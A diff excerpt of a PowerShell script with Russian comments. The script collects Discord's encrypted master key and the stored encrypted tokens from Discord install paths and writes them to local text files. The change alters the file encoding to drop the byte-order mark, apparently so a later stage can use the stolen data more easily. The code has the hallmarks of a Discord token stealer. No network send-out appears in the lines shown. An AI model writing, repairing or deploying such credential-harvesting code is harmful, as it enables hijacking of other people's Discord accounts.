@@ -40,7 +40,6 @@ function Get-EncryptedMasterKey {
             }
         }
         
-        # Возвращаем ЗАШИФРОВАННЫЙ мастер-ключ (как массив байт)
         return $encrypted_key
     } catch {
         return $null
@@ -74,9 +73,10 @@ foreach ($discord_path in $discord_paths) {
     if (!$encrypted_master_key) {
         $encrypted_master_key = Get-EncryptedMasterKey -discord_path $discord_path
         if ($encrypted_master_key) {
-            # Сохраняем зашифрованный мастер-ключ в Base64
+            # Сохраняем зашифрованный мастер-ключ в Base64 (БЕЗ BOM)
             $encrypted_master_key_base64 = [Convert]::ToBase64String($encrypted_master_key)
-            $encrypted_master_key_base64 | Out-File -FilePath "encrypted_master_key.txt" -Encoding UTF8
+            # Используем Out-File с параметрами для предотвращения BOM
+            $encrypted_master_key_base64 | Out-File -FilePath "encrypted_master_key.txt" -Encoding ASCII -NoNewline
         }
     }
     
@@ -89,4 +89,5 @@ foreach ($discord_path in $discord_paths) {
 if ($all_encrypted_tokens.Count -eq 0) { exit 1 }
 if (!$encrypted_master_key) { exit 1 }
 
-$all_encrypted_tokens | Out-File -FilePath "encrypted_tokens.txt" -Encoding UTF8
+# Сохраняем токены (БЕЗ BOM)
+$all_encrypted_tokens | Out-File -FilePath "encrypted_tokens.txt" -Encoding ASCII
